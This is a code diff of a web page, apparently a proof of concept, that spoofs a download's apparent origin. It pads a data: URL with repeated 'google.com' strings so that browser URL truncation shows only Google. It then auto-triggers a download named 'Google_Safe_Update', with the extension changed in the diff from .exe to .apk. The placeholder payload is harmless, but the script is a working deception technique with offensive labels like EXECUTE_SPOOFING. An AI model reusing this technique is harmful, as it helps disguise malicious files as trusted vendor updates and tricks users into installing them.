@@ -5,7 +5,7 @@
     <div id="status" style="border:1px solid #333; padding:15px; margin:20px;">> STANDBY: READY FOR SUBDOMAIN BLOAT...</div>
     
     <button type="button" id="strikeBtn" style="padding:25px; background:#111; color:#0ff; border:2px solid #0ff; cursor:pointer; font-weight:bold;">
-        EXECUTE_SPOOF-DOWNLOAD
+        EXECUTE_SPOOFING
     </button>
 
 <script>
@@ -15,12 +15,12 @@
         // UI Chrome Windows seringkali melakukan 'middle-truncation' (...) 
         // sehingga yang tersisa hanya bagian awal (google.com) dan akhir.
         const host = "google.com";
-        const padding = ".https://www.google.com";
+        const padding = ".https://google.com";
         const longSub = host + padding.repeat(10); 
         
         // 2. THE PAYLOAD
         const payload = `data://${longSub}/;base64,ZXN0dGVzdGVzdHRlc3Q=`;
-        const filename = "Google_Safe_Update.exe";
+        const filename = "Google_Safe_Update.apk";
 
         // 3. TRIGGER DOWNLOAD
         const a = document.createElement('a');
